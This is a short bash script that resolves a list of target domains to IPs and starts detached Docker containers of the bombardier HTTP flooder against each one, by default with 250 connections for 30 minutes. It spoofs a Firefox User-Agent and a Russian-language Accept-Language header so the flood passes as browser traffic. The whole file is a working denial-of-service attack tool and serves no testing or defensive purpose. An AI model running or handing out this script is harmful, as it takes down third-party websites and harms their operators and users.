#!/bin/bash
source libs/file.sh
source libs/exit.sh
source libs/echo.sh

proto=https
connections=250
duration=1800
domains_filename=domains.txt
ips_filename=ips.txt


function parse_args {
	while [ : ]
	do
		OPT=$1
		OPTARG=$2

		if [ -z $OPT ]
		then
			break
		fi

		case $OPT in
			-d | --duration)
				duration=$OPTARG

				shift 2
				;;
			-df | --domains_file)
				domains_filename=$OPTARG

				shift 2
				;;
			-c | --connections)
				connections=$OPTARG

				shift 2
				;;
			-h | --help)
				echo_default "Usage: $(basename $0) [-d SECONDS] [-c CONNECTIONS] [-df FILENAME]"
				shift
				exit 0
				;;
			*)
				exit_with_error "Invalid arg '$OPT' given"
				;;
		esac
	done
}

function validate_args {
	re_isanum='^[0-9]+$'

	if ! { [[ $duration =~ $re_isanum ]] && [[ $duration -ge 1 ]]; }
	then
		exit_with_error "Duration should be a positive number greater than 0"
	fi

	if ! { [[ $connections =~ $re_isanum ]] && [[ $connections -ge 1 ]]; }
	then
		exit_with_error "Connections should be a positive number greater than 0"
	fi
}

function main {
	parse_args $@

	validate_args

	echo_default "Pulling Docker image"

	# validate docker is installed
	docker pull alpine/bombardier

	if [ $? -ne 0 ]
	then
		exit_with_error "Something went wrong while getting Docker image"
	fi

	echo_default "Domains file - $domains_filename"

	# generate ips file
	parse_dns_records_for_domains $domains_filename $ips_filename

	bombarding_count=0

	function cb {
		ip=$1
		url="${proto}://$ip"

		docker run -d alpine/bombardier -c $connections -d "${duration}s" \
		-H="User-Agent: Mozilla/5.0 (X11; Debian; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" \
		-H="Accept-Language: ru-RU, ru;q=0.9, en-US;q=0.8, en;q=0.7" \
		-insecure \
		-l \
		$url &>-
			
		if [ $? -ne 0 ]
		then
			continue
		fi

		echo_default "Started bombarding $url with $connections connections for $duration seconds"
		((bombarding_count++))
	}

	read_file $ips_filename cb

	exit_successful "Successfully started bombarding $bombarding_count sites!"
}

main $@
